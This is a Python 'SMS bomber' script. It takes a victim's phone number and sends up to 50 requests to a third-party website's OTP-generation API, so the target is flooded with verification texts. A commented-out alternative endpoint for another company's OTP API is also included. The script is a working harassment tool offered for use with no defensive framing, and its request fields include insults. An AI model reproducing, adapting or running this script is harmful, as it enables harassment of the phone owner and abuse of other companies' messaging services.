#!/usr/bin/env python

import requests
import random
import time
import colorama
import os
try:
    import requests
except ImportError:
    print('[!] Error: some dependencies are not installed')
    print('Type \'pip install requests to install the missing package')
    exit()

colors=['\u001b[38;5;208m','\u001b[38;5;231m','\u001b[38;5;82m','\033[1;32m','\033[1;33m','\033[1;34m']
W='\033[31m'

def clr():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def banner():
    
    logo = '''\n
███████╗███╗   ███╗███████╗    ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
███████╗██╔████╔██║███████╗    ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
╚════██║██║╚██╔╝██║╚════██║    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
███████║██║ ╚═╝ ██║███████║    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
╚══════╝╚═╝     ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
    '''
    print (random.choice(colors)+logo+W)
    print("\n") 

banner()
URL = ('http://dreamydroshky.in/api/Web/GetOtp')
# URL = ('https://www.oyorooms.com/api/pwa/generateotp')

#params defined here

while True:
    Mobile = input("Enter the number : ")
    if len(Mobile) <= 9:
        print("\033[91m[*] "+ "Invalid Phone number"+W+ "\n")
        continue
    elif len(Mobile) > 10:
        print("\033[91m[*]"+ "Invalid Phone Number"+W+ "\n")
        continue
    for cch in str(Mobile):
        if not cch.isdigit():
            print('\n\nPhone Number Must Consist Of Numbers Only\n')
            continue
        break
    bomb = int(input("Number of times to bomb (maximum 200): "))
    if bomb >= 200:
        print("[*] "+"you have entered"+"[*]"+str(bomb))
        print("normalizing value to 50")
        bomb = 50
        time.sleep(5.5)
    count = 0
    erro = 1
    break

def checkinternet():
    res = False
    try:
        requests.get('https://www.google.com', verify=True)
        res = False
    except Exception:
        res = True
    if res:
        print("\n\n\t\033[91m[*]It seems That Your Internet Speed is Slow or You Are Using Proxies...")
        print("\t\tI \033[91m[*]can't bomb up now..\n\n")
        exit()
clr()
checkinternet()

def mai(Mobile, bomb, count, erro):
    for i in range(bomb):
        Data = str(random.choice(['Chor','Chutiya','Harsh','Harshal','rajan']))
        data = {"Fk_memId":0,"AndroidId":"","DeviceId":"","ProcId":4,"Otpno":0,"Data":Data,"Mobile":Mobile,"Purpose":"Registration"}
        r = requests.post(url=URL, data=data)
        data = r.json()
        a = str(data['response'])
        count += 1
        if a == "Success":
            print ("\033[92m[+]"+W+" HITS = ", str(i+1)+ W)
        else:
            print("\033[91m[*] "+W+" HITS Failed = "+str(erro)+ W )
            erro += 1
mai(Mobile, bomb, count, erro)